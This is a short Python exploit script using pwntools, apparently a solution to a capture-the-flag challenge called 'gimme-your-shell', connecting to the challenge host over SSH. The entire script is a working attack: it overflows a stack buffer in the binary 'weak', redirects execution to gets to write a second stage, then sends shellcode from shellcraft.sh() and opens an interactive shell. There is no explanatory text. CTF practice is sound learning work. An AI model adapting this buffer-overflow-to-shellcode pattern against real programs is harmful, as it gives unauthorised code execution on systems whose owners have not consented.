from pwn import *

context.arch='amd64'
#p=process('./weak')
p=process(['ssh','-i','../x.pem','-p','2225','user@gimme-your-shell.ctf.insecurity-insa.fr'])
e=ELF('./weak')

gets=e.plt['gets']

pay='A'*0x10
pay+=p64(0x0600500)
pay+=p64(0x400570)


p.sendlineafter('president',pay)

pay2='A'*24
pay2+=p64(0x600510)
pay2+=asm(shellcraft.sh())

pause()
p.sendline(pay2)
p.interactive()
